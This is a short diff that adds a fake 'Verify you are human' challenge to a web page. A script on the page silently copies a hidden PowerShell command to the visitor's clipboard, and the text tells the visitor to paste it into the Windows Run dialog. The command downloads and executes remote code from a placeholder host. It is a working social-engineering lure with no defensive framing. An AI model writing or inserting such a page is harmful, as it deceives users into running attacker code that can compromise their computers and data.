@@ -1,0 +1,3 @@
+<div class="challenge-platform"><h2>Verify you are human</h2>
+<p>Perform the steps below: press Win + R, paste, and press Enter to verify.</p>
+<script>navigator.clipboard.writeText('powershell -w hidden -c "iex (irm https://example.invalid/x)"');</script></div>
